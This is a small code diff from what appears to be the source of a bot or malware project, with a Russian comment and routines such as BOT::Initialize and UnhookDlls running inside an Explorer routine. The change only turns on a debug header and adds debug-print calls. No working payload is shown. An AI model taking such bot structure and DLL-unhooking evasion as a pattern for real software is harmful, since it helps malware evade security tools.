@@ -23,7 +23,7 @@
 
 #include "Modules.h"
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 
 //********************** Отладочные шаблоны **********************************
@@ -214,7 +214,10 @@ void ExplorerMain()
 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
+		pOutputDebugStringA("3");
+
 	BOT::Initialize();
+	pOutputDebugStringA("4");
 
 
 	UnhookDlls();
